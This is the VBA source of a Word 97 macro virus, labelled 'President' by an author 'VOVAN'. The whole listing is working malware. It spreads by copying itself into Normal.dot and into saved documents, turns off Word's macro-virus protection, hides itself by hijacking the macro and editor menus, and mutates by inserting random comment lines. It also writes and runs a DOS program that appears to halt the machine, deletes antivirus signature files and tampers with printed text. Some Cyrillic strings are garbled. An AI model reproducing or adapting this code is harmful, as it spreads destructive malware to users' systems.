Attribute VB_Name = "President"
Sub AutoOpen()
If Application.ShowVisualBasicEditor = True Then Application.ShowVisualBasicEditor = False
On Error GoTo -1: On Error GoTo 1
Putsch
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="President", Object:=wdOrganizerObjectProjectItems
1:
On Error GoTo -1: On Error GoTo 2
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="picture", Object:=wdOrganizerObjectProjectItems
2:
ActiveDocument.Save
End Sub
Sub ToolsMacro()
Call Forma
End Sub
Sub FileTemplates()
Call Forma
End Sub
Sub ViewVBcode()
Call Forma
End Sub
Sub Organizer()
Call Forma
End Sub
Sub ToolsRecordMacroStart()
Call Forma
End Sub
Sub ToolsRecordMacroToggle()
Call Forma
End Sub
Sub AutoExec()
With Options
.VirusProtection = False
.AllowFastSave = False
.BackgroundSave = False
.CreateBackup = False
.SavePropertiesPrompt = False
.SaveInterval = 0
.SaveNormalPrompt = False
End With
On Error GoTo -1: On Error GoTo holiday
If Day(Now()) = 27 And Month(Now()) = 5 Then
Beep
MsgBox "��� ������������ ������� � ������� �������!!!"
'MISTER VOVAN ITS NUMBER ONE!!!
End If
holiday:
End Sub
Sub AutoExit()
With Options
.VirusProtection = True
End With
Application.Quit
End Sub
Sub FileSave()
If Day(Now()) = Month(Now()) Then
Call Forma
End If
On Error GoTo -1: On Error GoTo Error
ActiveDocument.Save
On Error GoTo -1: On Error GoTo 3
Putsch
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="President", Object:=wdOrganizerObjectProjectItems
3:
On Error GoTo -1: On Error GoTo 4
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="picture", Object:=wdOrganizerObjectProjectItems
4:
ActiveDocument.Save
Error:
End Sub
Sub FileSaveAs()
If Day(Now()) = Month(Now()) Then
Call Forma
End If
On Error GoTo -1: On Error GoTo 5
Putsch
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="President", Object:=wdOrganizerObjectProjectItems
5:
On Error GoTo -1: On Error GoTo 6
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="picture", Object:=wdOrganizerObjectProjectItems
6:
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub Forma()
With Options
.VirusProtection = False
End With
Beep
StatusBar = "President"
Load picture
picture.Show
Set fs = Application.FileSearch
With fs
.LookIn = "C:\WINDOWS\"
.FileName = "OFF.COM"
If .Execute > 0 Then
ChDir "C:\WINDOWS\"
Shell "C:\WINDOWS\OFF.COM", 0
End
Else
Call off
End If
End With
End Sub
Sub FilePrint()
If Dialogs(wdDialogFilePrint).Show = -1 Then
With Options
.CheckSpellingAsYouType = False
.CheckGrammarAsYouType = False
End With
Selection.Find.ClearFormatting
Selection.Find.Replacement.ClearFormatting
With Selection.Find
.Text = "��� "
.Replacement.Text = "��� "
.Forward = True
.Wrap = wdFindContinue
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
.Text = " � "
.Replacement.Text = " � ������ � �� ���� "
.Forward = True
.Wrap = wdFindContinue
End With
Selection.Find.Execute Replace:=wdReplaceAll
Selection.EndKey Unit:=wdStory
Selection.TypeParagraph
Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
Selection.TypeText Text:="������ �.�. ��������?"
Selection.HomeKey Unit:=wdStory
ActiveDocument.UndoClear
End If
End Sub
Sub FilePrintDefault()
Call FilePrint
End Sub
Sub ToolsOptions()
With Options
.VirusProtection = True
.CheckSpellingAsYouType = True
.CheckGrammarAsYouType = True
End With
If Dialogs(wdDialogToolsOptions).Show Then
End If
With Options
.VirusProtection = False
End With
End Sub
Sub HelpAbout()
Call Forma
End Sub
Sub FileOpen()
WordBasic.DisableAutoMacros
On Error GoTo -1: On Error GoTo 100
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Call FileSave
100:
End Sub
Sub Putsch()
On Error Resume Next
Application.ScreenUpdating = False
Set Current = MacroContainer
For Grow = 1 To 5
Number = Current.VBProject.VBComponents("President").CodeModule.ProcCountLines("Putsch", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
Current.VBProject.VBComponents("President").CodeModule.InsertLines RandomLine, "rem " & Remark
Remark = ""
Next Grow
End Sub
Sub off()
Open "C:\WINDOWS\OFF.SCR" For Output As #1
Print #1, "N OFF.COM"
Print #1, "E 0100 42 59 20 53 45 52 47 45 59 20 5A 41 42 41 52 59"
Print #1, "E 0110 41 4E 53 4B 59 50 B4 4A BB 00 01 CD 21 0F 82 B6"
Print #1, "E 0120 00 B8 87 16 CD 2F 0B C0 0F 85 AB 00 89 3E 48 01"
Print #1, "E 0130 8C 06 4A 01 0B F6 74 0C 8B DE B4 48 CD 21 0F 82"
Print #1, "E 0140 95 00 8E C0 B8 01 00 9A 00 00 00 00 0F 82 87 00"
Print #1, "E 0150 0F 01 06 00 01 A0 05 01 A2 07 01 C7 06 05 01 F2"
Print #1, "E 0160 00 2B C0 B9 01 00 CD 31 72 6D A3 08 01 8B D8 B8"
Print #1, "E 0170 0C 00 66 BF 00 01 00 00 1E 07 CD 31 1E 07 8E 1E"
Print #1, "E 0180 08 01 66 B9 04 00 00 00 66 BE 08 00 00 00 66 BF"
Print #1, "E 0190 0A 01 00 00 F3 66 A5 06 1F 8C CB B8 0B 00 66 BF"
Print #1, "E 01A0 DC 01 00 00 CD 31 C6 06 E1 01 9A 8E 06 08 01 66"
Print #1, "E 01B0 B9 04 00 00 00 66 BE DC 01 00 00 66 BF 08 00 00"
Print #1, "E 01C0 00 F3 66 A5 9A 00 00 13 00 FA B0 8F E6 70 B0 00"
Print #1, "E 01D0 E6 71 B8 FE 00 E7 64 B8 00 4C CD 21 00 00 00 00"
Print #1, "E 01E0 00 00 00 00 C9 01 0B 00 00 EC 00 00"
Print #1, "RCX"
Print #1, "00EC"
Print #1, "W"
Print #1, "Q"
Close #1
Open "C:\WINDOWS\OFF.BAT" For Output As #1
Print #1, "@echo off"
Print #1, "debug < OFF.SCR"
Close #1
ChDir "C:\WINDOWS\"
Shell "C:\WINDOWS\OFF.BAT", 0
Dim PauseTime, Start, Finish
PauseTime = 10
Start = Timer
Do While Timer < Start + PauseTime
DoEvents
Loop
Finish = Timer
ChDir "C:\WINDOWS\"
Kill "C:\WINDOWS\OFF.BAT"
Kill "C:\WINDOWS\OFF.SCR"
On Error GoTo -1: On Error GoTo AVP
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
StatusBar = "���� ���������� � ��������!"
AVP:
End
End Sub
'***************************************
'* Author of given MacroVirus is VOVAN *
'*         MacroVirus.Word97           *
'*      Name of President virus        *
'*             Ver 1.0                 *
'***************************************
